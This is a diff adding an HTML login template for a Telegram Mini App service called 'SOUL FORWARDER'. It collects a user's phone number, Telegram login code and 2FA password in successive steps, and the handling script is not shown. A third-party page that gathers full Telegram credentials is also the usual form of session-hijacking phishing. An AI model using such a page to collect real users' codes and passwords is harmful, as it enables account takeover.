@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Login</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/styles.css') }}">
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+</head>
+<body>
+    <div class="container">
+        <div id="phone-container" class="form-container active">
+            <div class="logo">
+                <svg xmlns="http://www.w3.org/2000/svg" width="80" height="80" viewBox="0 0 24 24" fill="none" stroke="#0088cc" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M15 3h4a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2h-4"></path>
+                    <polyline points="10 17 15 12 10 7"></polyline>
+                    <line x1="15" y1="12" x2="3" y2="12"></line>
+                </svg>
+            </div>
+            <h1>Login to SOUL FORWARDER</h1>
+            <h1>Hey {% if first_name %}{{ first_name }}{% else %}there{% endif %} 👋</h1>
+            <p class="subtitle">Please enter your phone number to continue</p>
+            <form id="phone-form">
+                <div class="input-group">
+                    <input type="tel" id="phone" name="phone" placeholder="+1 234 567 8900" required>
+                    <label for="phone">+1 234 567 8900</label>
+                </div>
+                <input type="hidden" id="user_id" name="user_id" value="{{ user_id }}">
+                <button type="submit" class="btn-primary">Next</button>
+            </form>
+        </div>
+        
+
+        <div id="otp-container" class="form-container">
+            <div class="back-button" id="back-to-phone">
+                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m15 18-6-6 6-6"/></svg>
+            </div>
+            <h1>Enter Verification Code</h1>
+            <p class="subtitle">We've sent a code to your phone</p>
+            <form id="otp-form">
+                <input type="hidden" id="stored-phone" name="phone">
+                <div class="otp-inputs">
+                    <input type="text" maxlength="1" class="otp-input" data-index="1">
+                    <input type="text" maxlength="1" class="otp-input" data-index="2">
+                    <input type="text" maxlength="1" class="otp-input" data-index="3">
+                    <input type="text" maxlength="1" class="otp-input" data-index="4">
+                    <input type="text" maxlength="1" class="otp-input" data-index="5">
+                </div>
+                <input type="hidden" id="full-otp" name="otp">
+                <button type="submit" class="btn-primary">Verify</button>
+            </form>
+        </div>
+
+        <div id="twofa-container" class="form-container">
+            <div class="back-button" id="back-to-otp">
+                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m15 18-6-6 6-6"/></svg>
+            </div>
+            <h1>Two-Factor Authentication</h1>
+            <p class="subtitle">Please enter your 2FA password</p>
+            <form id="twofa-form">
+                <div class="input-group">
+                    <input type="password" id="password" name="password" required>
+                    <label for="password">Password</label>
+                </div>
+                <button type="submit" class="btn-primary">Verify</button>
+            </form>
+        </div>
+
+        <div id="success-container" class="form-container">
+            <div class="success-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="64" height="64" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg>
+            </div>
+            <h1>Login Successful!</h1>
+            <p class="subtitle">You are now logged in to your Telegram account</p>
+            <p class="closing-text">This window will close in <span id="countdown">5</span> seconds</p>
+        </div>
+    </div>
+
+    <script src="{{ url_for('static', filename='js/script.js') }}"></script>
+</body>
+</html>
